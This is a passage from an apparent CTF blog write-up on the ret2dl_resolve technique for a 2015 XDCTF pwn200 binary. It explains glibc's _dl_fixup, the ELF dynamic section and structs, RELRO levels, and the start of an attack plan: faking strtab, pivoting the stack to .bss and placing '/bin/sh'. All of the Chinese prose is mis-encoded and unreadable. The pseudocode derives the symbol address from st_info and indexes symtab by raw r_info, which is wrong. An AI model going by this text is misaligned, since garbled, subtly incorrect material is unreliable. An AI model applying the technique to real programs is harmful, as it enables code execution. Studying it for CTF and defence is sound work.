DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">   	...</span><br></pre></td></tr></table></figure>

<p><code>l_info</code>çš„ç±»å‹æ˜¯<code>ElfW(Dyn)**</code>,ä¹Ÿå°±æ˜¯<code>Elf32_Dyn**</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªäºŒçº§æŒ‡é’ˆï¼Œæˆ–è€…è¯´æ•°ç»„æŒ‡é’ˆ</p>
<p>æ„æ€æ˜¯åœ¨å†…å­˜æŸä¸ªåœ°æ–¹æœ‰ä¸€ä¸ª<code>dynamic</code>æ•°ç»„ï¼Œç„¶åè¿™ä¸ªæŒ‡é’ˆæŒ‡å‘æ•°ç»„çš„åŸºåœ°å€</p>
<p>åœ¨è¿è¡Œæ—¶<code>l_info</code>æŒ‡å‘æ‰€åœ¨æ¨¡å—çš„çš„<code>dynamic</code>èŠ‚</p>
<p><code>dynamic</code>èŠ‚åŠ è½½è¿›å…¥å†…å­˜çš„åœ°å€æ˜¯ç¡®å®šçš„ï¼Œæ¯”å¦‚æœ¬ç¨‹åºä¸­åœ¨<code>0x080497c4</code>,å¯ä»¥ä½¿ç”¨<code>readelf -S</code>æŸ¥çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">â””â”€<span class="meta"># readelf -S main_no_relro_32</span></span><br><span class="line">There are <span class="number">30</span> section headers, starting at offset <span class="number">0x10b0</span>:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">	...</span><br><span class="line">  [<span class="number">21</span>] .dynamic          DYNAMIC         <span class="number">080497</span>c4 <span class="number">0007</span>c4 <span class="number">0000e8</span> <span class="number">08</span>  WA  <span class="number">6</span>   <span class="number">0</span>  <span class="number">4</span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>GOT.PLT</code>è¡¨çš„æœ€å¤´éƒ¨,ä¹Ÿä¿å­˜ç€ä¸€ä¸ª<code>_DYNAMIC</code>çš„æŒ‡é’ˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GOT.PLT[0] =&gt; _DYNAMIC</span><br><span class="line">GOT.PLT[1] =&gt; link_map</span><br><span class="line">GOT.PLT[2] =&gt; dl_runtime_resolve</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p>dynamicèŠ‚ä¸­çš„å†…å®¹å¯ä»¥ç”¨<code>readelf -d</code>æŸ¥çœ‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Executor)-[/home/dustball/ctf-challenges/pwn/stackoverflow/ret2dlresolve/<span class="number">2015</span>-xdctf-pwn200/<span class="number">32</span>/no-relro]</span><br><span class="line">â””â”€<span class="meta"># readelf -d main_no_relro_32</span></span><br><span class="line"></span><br><span class="line">Dynamic section at offset <span class="number">0x7c4</span> contains <span class="number">24</span> entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> <span class="number">0x00000001</span> (NEEDED)                     Shared library: [libc.so<span class="number">.6</span>]</span><br><span class="line"> <span class="number">0x0000000c</span> (INIT)                       <span class="number">0x804832c</span></span><br><span class="line"> <span class="number">0x0000000d</span> (FINI)                       <span class="number">0x8048634</span></span><br><span class="line"> <span class="number">0x00000019</span> (INIT_ARRAY)                 <span class="number">0x80497bc</span></span><br><span class="line"> <span class="number">0x0000001b</span> (INIT_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x0000001a</span> (FINI_ARRAY)                 <span class="number">0x80497c0</span></span><br><span class="line"> <span class="number">0x0000001c</span> (FINI_ARRAYSZ)               <span class="number">4</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffef5</span> (GNU_HASH)                   <span class="number">0x804818c</span></span><br><span class="line"> <span class="number">0x00000005</span> (STRTAB)                     <span class="number">0x804824c</span></span><br><span class="line"> <span class="number">0x00000006</span> (SYMTAB)                     <span class="number">0x80481ac</span></span><br><span class="line"> <span class="number">0x0000000a</span> (STRSZ)                      <span class="number">107</span> (bytes)</span><br><span class="line"> <span class="number">0x0000000b</span> (SYMENT)                     <span class="number">16</span> (bytes)</span><br><span class="line"> <span class="number">0x00000015</span> (DEBUG)                      <span class="number">0x0</span></span><br><span class="line"> <span class="number">0x00000003</span> (PLTGOT)                     <span class="number">0x80498b8</span></span><br><span class="line"> <span class="number">0x00000002</span> (PLTRELSZ)                   <span class="number">40</span> (bytes)</span><br><span class="line"> <span class="number">0x00000014</span> (PLTREL)                     REL</span><br><span class="line"> <span class="number">0x00000017</span> (JMPREL)                     <span class="number">0x8048304</span></span><br><span class="line"> <span class="number">0x00000011</span> (REL)                        <span class="number">0x80482ec</span></span><br><span class="line"> <span class="number">0x00000012</span> (RELSZ)                      <span class="number">24</span> (bytes)</span><br><span class="line"> <span class="number">0x00000013</span> (RELENT)                     <span class="number">8</span> (bytes)</span><br><span class="line"> <span class="number">0x6ffffffe</span> (VERNEED)                    <span class="number">0x80482cc</span></span><br><span class="line"> <span class="number">0x6fffffff</span> (VERNEEDNUM)                 <span class="number">1</span></span><br><span class="line"> <span class="number">0x6ffffff0</span> (VERSYM)                     <span class="number">0x80482b8</span></span><br><span class="line"> <span class="number">0x00000000</span> (<span class="literal">NULL</span>)                       <span class="number">0x0</span></span><br></pre></td></tr></table></figure>

<p>æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ª<code>Elf32_Dyn</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">LOAD:080497C4 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BCâ†‘o</span><br><span class="line">LOAD:080497C4                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_â†“o</span><br><span class="line">LOAD:080497C4                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:080497CC                 Elf32_Dyn &lt;0Ch, &lt;804832Ch&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:080497D4                 Elf32_Dyn &lt;0Dh, &lt;8048634h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:080497DC                 Elf32_Dyn &lt;19h, &lt;80497BCh&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:080497E4                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:080497EC                 Elf32_Dyn &lt;1Ah, &lt;80497C0h&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:080497F4                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:080497FC                 Elf32_Dyn &lt;6FFFFEF5h, &lt;804818Ch&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049804                 Elf32_Dyn &lt;5, &lt;804824Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:0804980C                 Elf32_Dyn &lt;6, &lt;80481ACh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049814                 Elf32_Dyn &lt;0Ah, &lt;6Bh&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:0804981C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049824                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:0804982C                 Elf32_Dyn &lt;3, &lt;80498B8h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049834                 Elf32_Dyn &lt;2, &lt;28h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:0804983C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049844                 Elf32_Dyn &lt;17h, &lt;8048304h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:0804984C                 Elf32_Dyn &lt;11h, &lt;80482ECh&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049854                 Elf32_Dyn &lt;12h, &lt;18h&gt;&gt;  ; DT_RELSZ</span><br><span class="line">LOAD:0804985C                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049864                 Elf32_Dyn &lt;6FFFFFFEh, &lt;80482CCh&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:0804986C                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049874                 Elf32_Dyn &lt;6FFFFFF0h, &lt;80482B8h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:0804987C                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype Elf32_Dyn</span><br><span class="line">type = <span class="keyword">struct</span> &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="2-ç”±dynamicèŠ‚æ‰¾å…¶ä»–å„èŠ‚"><a href="#2-ç”±dynamicèŠ‚æ‰¾å…¶ä»–å„èŠ‚" class="headerlink" title="2.ç”±dynamicèŠ‚æ‰¾å…¶ä»–å„èŠ‚"></a>2.ç”±dynamicèŠ‚æ‰¾å…¶ä»–å„èŠ‚</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">symtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">strtab 	= (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);	</span><br><span class="line">pltgot 	= (<span class="type">uintptr_t</span>) D_PTR (l, l_info[DT_PLTGOT]);		<span class="comment">//å®é™…ä¸Š_dl_fixupä¸­æ²¡æœ‰ç”¨åˆ°</span></span><br><span class="line">reloc 	= (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰å››ä¸ªèŠ‚,å®é™…ä¸Šæ¯ä¸ªèŠ‚éƒ½æ˜¯è¡¨</p>
<table>
<thead>
<tr>
<th>è¡¨å</th>
<th>å…ƒç´ ç±»å‹</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>symtabç¬¦å·è¡¨</td>
<td>struct Elf32_Sym</td>
<td>ä¿å­˜ç¬¦å·ååœ¨strtabä¸­çš„åç§»,<br />ä¿å­˜ç¬¦å·åœ¨æ¨¡å—ä¸­çš„ç›¸å¯¹åœ°å€<br />â€¦</td>
</tr>
<tr>
<td>strtabå­—ç¬¦ä¸²è¡¨</td>
<td>char</td>
<td>ä¿å­˜æœ¬æ¨¡å—ä¸­æ‰€æœ‰éœ€è¦åŠ¨æ€é“¾æ¥çš„ç¬¦å·å</td>
</tr>
<tr>
<td>pltgotè¿‡ç¨‹é“¾æ¥è¡¨</td>
<td></td>
<td>å®é™…ä¸Š<code>_dl_fixup</code>ä¸­æ²¡æœ‰ç”¨åˆ°</td>
</tr>
<tr>
<td>jmprelé‡å®šä½è¡¨</td>
<td>struct Elf32_Rel</td>
<td>ä¿å­˜ç¬¦å·çš„è™šæ‹Ÿåœ°å€,<br />ä¿å­˜ç¬¦å·åœ¨ç¬¦å·è¡¨ä¸­çš„åç§»</td>
</tr>
</tbody></table>
<p>symtabç¬¦å·è¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word	st_name;		<span class="comment">/* Symbol name (string tbl index) */</span><span class="comment">//ç¬¦å·ååœ¨strtabä¸­çš„åç§»</span></span><br><span class="line">  Elf32_Addr	st_value;		<span class="comment">/* Symbol value */</span>	<span class="comment">//ç¬¦å·åœ¨å…¶æ¨¡å—ä¸­ç›¸å¯¹åœ°å€</span></span><br><span class="line">  Elf32_Word	st_size;		<span class="comment">/* Symbol size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_info;		<span class="comment">/* Symbol type and binding */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span>	st_other;		<span class="comment">/* Symbol visibility */</span></span><br><span class="line">  Elf32_Section	st_shndx;		<span class="comment">/* Section index */</span></span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p>jmprelé‡å®šä½è¡¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Addr	r_offset;		<span class="comment">/* Address */</span></span><br><span class="line">  Elf32_Word	r_info;			<span class="comment">/* Relocation type and symbol index */</span></span><br><span class="line">&#125; Elf32_Rel;</span><br></pre></td></tr></table></figure>







<h3 id="3-åœ¨æœ¬æ¨¡å—ç¬¦å·è¡¨ä¸­æ‰¾åˆ°å¯¹åº”è¡¨é¡¹"><a href="#3-åœ¨æœ¬æ¨¡å—ç¬¦å·è¡¨ä¸­æ‰¾åˆ°å¯¹åº”è¡¨é¡¹" class="headerlink" title="3.åœ¨æœ¬æ¨¡å—ç¬¦å·è¡¨ä¸­æ‰¾åˆ°å¯¹åº”è¡¨é¡¹"></a>3.åœ¨æœ¬æ¨¡å—ç¬¦å·è¡¨ä¸­æ‰¾åˆ°å¯¹åº”è¡¨é¡¹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reloc = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset (pltgot, reloc_arg));<span class="comment">//åœ¨é‡å®šä½è¡¨ä¸­çš„è¡¨é¡¹</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];	<span class="comment">//åœ¨ç¬¦å·è¡¨ä¸­çš„è¡¨é¡¹</span></span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;	<span class="comment">//å‰¯æœ¬</span></span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);	<span class="comment">//GOTè¡¨é¡¹åœ°å€,ä¸ºåæ¥å›å¡«åšå‡†å¤‡</span></span><br></pre></td></tr></table></figure>





<p>ä¸‹é¢åˆ°4ä¹‹å‰æ˜¯ä¸€äº›æ£€æŸ¥,å¿½ç•¥</p>
<h3 id="4-è§£æç¬¦å·"><a href="#4-è§£æç¬¦å·" class="headerlink" title="4.è§£æç¬¦å·"></a>4.è§£æç¬¦å·</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 	<span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>* <span class="title">result</span>;</span></span><br><span class="line"> 	Elf32_Addr value;</span><br><span class="line"></span><br><span class="line">result = _dl_lookup_symbol_x (</span><br><span class="line">         strtab + sym-&gt;st_name, 		<span class="comment">//ç¬¦å·åå­—ç¬¦ä¸²</span></span><br><span class="line">         l, 							<span class="comment">//æœ¬æ¨¡å—çš„link_map</span></span><br><span class="line">         &amp;sym, 						<span class="comment">//è¿”å›å€¼,å¦‚æœåœ¨å…¶ä»–æ¨¡å—æ‰¾åˆ°è¯¥ç¬¦å·åˆ™è¿”å›å…¶ç¬¦å·è¡¨é¡¹</span></span><br><span class="line">         l-&gt;l_scope,</span><br><span class="line">         version, </span><br><span class="line">         ELF_RTYPE_CLASS_PLT, </span><br><span class="line">         flags, </span><br><span class="line">         <span class="literal">NULL</span></span><br><span class="line">     );<span class="comment">//è¿”å›å€¼resultæ˜¯æ‰¾åˆ°ç¬¦å·å®ç°æ‰€åœ¨æ¨¡å—çš„link_map</span></span><br><span class="line"></span><br><span class="line">     value = DL_FIXUP_MAKE_VALUE (</span><br><span class="line">         result,</span><br><span class="line">         SYMBOL_ADDRESS (result, sym, <span class="literal">false</span>)<span class="comment">//ä»link_map *resultä¸­æå–ç›®æ ‡æ¨¡å—åŸºåœ°å€,åŠ ä¸Šsym.st_valueåç§»é‡å¾—åˆ°ç¬¦å·è™šæ‹Ÿåœ°å€</span></span><br><span class="line">     );</span><br></pre></td></tr></table></figure>





<h3 id="5-å›å¡«GOTè¡¨é¡¹"><a href="#5-å›å¡«GOTè¡¨é¡¹" class="headerlink" title="5.å›å¡«GOTè¡¨é¡¹"></a>5.å›å¡«GOTè¡¨é¡¹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæœ‰ä¸€ä¸ªå‹è¡Œ,å¹²äº†ä¸¤ä¸ªäº‹æƒ…,</p>
<p>ä¸€æ˜¯è°ƒç”¨elf_machine_fixup_pltæŠŠvalueå›å†™åˆ°rel_addrä¸Š</p>
<p>äºŒæ˜¯æŠŠvalueå€¼,ä¹Ÿå°±æ˜¯å·²ç»è§£æå‡ºæ¥çš„ç¬¦å·åœ°å€,æ”¾åˆ°eaxå¯„å­˜å™¨ä¸Šè¿”å›</p>
<p>æ³¨æ„æ­¤æ—¶æ˜¯åœ¨dl_fixupä¸­è¿”å›åˆ°dl_runtime_resolveä¸­</p>
<p>ä¸‹é¢çš„æŒ‡ä»¤æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">call _dl_fixup		# Call resolver.</span><br><span class="line">popl %edx		# Get <span class="keyword">register</span> content back.</span><br><span class="line">movl (%esp), %ecx</span><br><span class="line">movl %eax, (%esp)	# Store the function address.</span><br><span class="line">movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">ret $<span class="number">12</span>			# Jump to function address.</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°dl_runtime_resolveè¿”å›ä¹‹å‰,æ ˆé¡¶æ˜¯åˆšåˆšæ”¾å…¥çš„eax,ä¹Ÿå°±æ˜¯åˆšè§£æå‡ºæ¥çš„ç¬¦å·å€¼</p>
<p>ä¹Ÿå°±æ˜¯ç›´æ¥ ret2ç›®æ ‡å‡½æ•° äº†</p>
<h2 id="ret2dl-resolve-1"><a href="#ret2dl-resolve-1" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h2><p>èƒ½ä¸èƒ½è¿›è¡Œè¿™ç§åˆ©ç”¨,å¾—çœ‹RELROâœŒçš„è„¸è‰²</p>
<p>RELROä¿æŠ¤:</p>
<p>read only relocation,åªè¯»é‡å®šä½</p>
<p>é‰´äºæ”»å‡»è€…å¯ä»¥ç¯¡æ”¹GOTè¡¨,å¡«å……å±é™©å‡½æ•°,å› æ­¤å¦‚æœGOTè¡¨æ˜¯åªè¯»çš„,æ”»å‡»è€…å°±æ²¡æ³•å†™äº†</p>
<p>RELROçš„ç›®çš„æ˜¯ä¿æŠ¤å‡½æ•°æŒ‡é’ˆ,é˜²æ­¢ç¯¡æ”¹</p>
<table>
<thead>
<tr>
<th>ä¿æŠ¤ç¨‹åº¦</th>
<th>æ•ˆæœ</th>
<th></th>
<th>ç¼–è¯‘é€‰é¡¹</th>
</tr>
</thead>
<tbody><tr>
<td>NO_RELRO</td>
<td>dynamicæ®µå¯å†™<br />GOTè¡¨å¯å†™,å…è®¸å»¶è¿Ÿç»‘å®š</td>
<td></td>
<td>-z norelro</td>
</tr>
<tr>
<td>PARTIAL_RELRO</td>
<td>dynamicæ®µåªè¯»,<br />ä½†æ˜¯GOTè¡¨è¿˜æ˜¯å¯å†™çš„,å…è®¸å»¶è¿Ÿç»‘å®š</td>
<td></td>
<td>-z lazy</td>
</tr>
<tr>
<td>FULL_RELRO</td>
<td>dynamicæ®µåªè¯»<br />GOTè¡¨åªè¯»,ä¸å…è®¸å»¶è¿Ÿç»‘å®š,æ‰€æœ‰ç¬¦å·å¿…é¡»åœ¨åŠ è½½ç¨‹åºæ—¶ç«‹åˆ»è§£æ</td>
<td></td>
<td>-z now</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>å›é¡¾<code>_dl_fixup</code>å‡½æ•°è§£æç¬¦å·çš„è¿‡ç¨‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193758449.png" alt="image-20240819193758449"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Algorithm _dl_fixup</span><br><span class="line">Input:	a Link_Map linkmap of the Main module, an index reloc_arg of the jmprel table </span><br><span class="line">Output:	virtual address of the target symbol</span><br><span class="line"></span><br><span class="line">dynamic = linkmap.l_info</span><br><span class="line">jmprel = dynamic[DT_JMPREL]</span><br><span class="line">strtab = dynamic[DT_STRTAB]</span><br><span class="line">symtab = dynamic[DT_SYMTAB]</span><br><span class="line"></span><br><span class="line">reloc = jmprel[reloc_arg]</span><br><span class="line">sym = symtab[reloc.r_info]</span><br><span class="line">str = strtab[sym.st_name]</span><br><span class="line"></span><br><span class="line"><span class="comment">//other_linkmapæ˜¯å…¶ä»–æ¨¡å—çš„Link_Mapç»“æ„</span></span><br><span class="line"><span class="comment">//_dl_lookup_symbol_x(str)ä»å…¶ä»–æ¨¡å—ä¸­å¯»æ‰¾strç¬¦å·,å¦‚æœæ‰¾åˆ°åˆ™è¿”å›è¯¥ç¬¦å·ä¸å…¶æ‰€åœ¨çš„link_map</span></span><br><span class="line">[sym,other_linkmap] = _dl_lookup_symbol_x(str)</span><br><span class="line"></span><br><span class="line"><span class="comment">//link_mapä¸­ä¿å­˜ç€ç›®æ ‡æ¨¡å—çš„åŸºåœ°å€,symä¸­ä¿å­˜ç€ç¬¦å·ç›¸å¯¹ç›®æ ‡æ¨¡å—çš„åç§»é‡,åŠ èµ·æ¥å¾—åˆ°ç¬¦å·çš„è™šæ‹Ÿåœ°å€</span></span><br><span class="line">vaddr = other_linkmap.laddr + sym.st_info</span><br></pre></td></tr></table></figure>



<h3 id="no-relro"><a href="#no-relro" class="headerlink" title="no_relro"></a>no_relro</h3><p>strtabèŠ‚é€šå¸¸å’ŒtextèŠ‚åŠ è½½åˆ°åŒä¸€ä¸ªåªè¯»æ®µ,å› æ­¤åœ¨strtabä¸Šç¯¡æ”¹å‡½æ•°åå­—ç¬¦ä¸²æ˜¯ä¸å¯èƒ½çš„</p>
<p>åœ¨no_relroä¿æŠ¤ä¸‹,dynamicèŠ‚å¯å†™, å¯ä»¥ç¯¡æ”¹dynamic.strtabæŒ‡é’ˆæŒ‡å‘fake strtab</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20240819193931068.png" alt="image-20240819193931068"></p>
<h3 id="partial-relro"><a href="#partial-relro" class="headerlink" title="partial_relro"></a>partial_relro</h3><p>åœ¨no_relroä¿æŠ¤ä¸­ï¼Œå¯ä»¥é€šè¿‡ç¯¡æ”¹dynamicèŠ‚ä¸­çš„æŒ‡é’ˆæŒ‡å‘å‡çš„strtabä¼ªé€ å‡çš„å‡½æ•°å</p>
<p>ä½†æ˜¯partial_relroä¿æŠ¤ä½¿å¾—dynamicèŠ‚åªè¯»ï¼Œæ— æ³•ç¯¡æ”¹å…¶ä¸­çš„å­—ç¬¦ä¸²è¡¨æŒ‡é’ˆ</p>
<h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><p>ç”±äºæˆ‘ä»¬éœ€è¦æ„é€ â€œ&#x2F;bin&#x2F;shâ€è¿™ç§å­—ç¬¦ä¸²,è¦ä¹ˆè°ƒç”¨readå‡½æ•°å¾€å†…å­˜é‡Œå†™,è¦ä¹ˆæº¢å‡ºæ—¶å†™è¿›å»</p>
<p>å‰è€…éœ€è¦å†æ„é€ readè°ƒç”¨çš„ropé“¾,å¹¶ä¸”è¿˜å¾—ç»™å­—ç¬¦ä¸²æ‰¾åœ°æ–¹,æ‰¾ä¸€ä¸ªæˆ‘ä»¬çŸ¥é“åœ°å€å¹¶ä¸”å¯å†™çš„åœ°æ–¹,æ¯”å¦‚bssæ®µ</p>
<p>åè€…ç”±äºæ ˆåœ°å€ä¸çŸ¥é“åœ¨å“ª,éœ€è¦åšä¸€ä¸ªæ ˆè¿ç§»,é¦–å…ˆæŠŠæ ˆæ¬åˆ°bssæ®µä¸Š</p>
<p>åè€…æ›´åŠ æ–¹ä¾¿,é‡‡å–åè€…</p>
<h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><p>åœ¨æœ¬é˜¶æ®µæˆ‘ä»¬æ„é€ ropé“¾æ¡,æ‰‹åŠ¨è°ƒç”¨</p>
